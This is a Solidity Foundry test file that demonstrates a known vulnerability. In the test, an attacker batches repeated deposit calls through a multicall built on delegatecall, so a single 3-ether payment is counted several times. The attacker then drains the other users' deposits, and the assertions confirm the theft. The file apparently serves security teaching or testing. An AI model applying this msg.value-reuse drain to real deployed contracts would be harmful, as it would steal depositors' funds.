// SPDX-License-Identifier: MIT

import {Test, console} from "forge-std/Test.sol";
import {MultiDelegateCall} from "../src/MultiDelegateCall.sol";

pragma solidity ^0.8.0;

contract MultiDelegateCallTest is Test {
    MultiDelegateCall multiDelegateCall;

    address public victim = makeAddr("victim");
    address public attacker = makeAddr("attacker");

    function setUp() public {
        vm.deal(victim, 10 ether);
        vm.startPrank(victim);
        multiDelegateCall = new MultiDelegateCall();
        vm.stopPrank();

        for (uint256 i = 0; i < 3; i++) {
            address user = makeAddr(string(abi.encodePacked("user", i)));
            hoax(user, 3 ether);
            multiDelegateCall.deposit{value: 3 ether}();
        }
        vm.deal(attacker, 3 ether);
    }

    function testMultiDelegateCall() public {
        uint256 currentNonce = vm.getNonce(attacker);
        uint256 attackerBalanceBefore = address(attacker).balance;
        bytes[] memory data = new bytes[](4);
        bytes memory data1 = abi.encodeWithSelector(MultiDelegateCall.deposit.selector);
        data[0] = data1;
        data[1] = data1;
        data[2] = data1;
        data[3] = data1;

        vm.startPrank(attacker);
        multiDelegateCall.multicall{value: 3 ether}(data);
        multiDelegateCall.withdraw(address(multiDelegateCall).balance);

        uint256 attackerBalanceAfter = address(attacker).balance;

        assertEq(address(multiDelegateCall).balance, 0);
        assert(vm.getNonce(attacker) < currentNonce + 3);
        assertEq(attackerBalanceAfter - attackerBalanceBefore, 9 ether);
    }
}
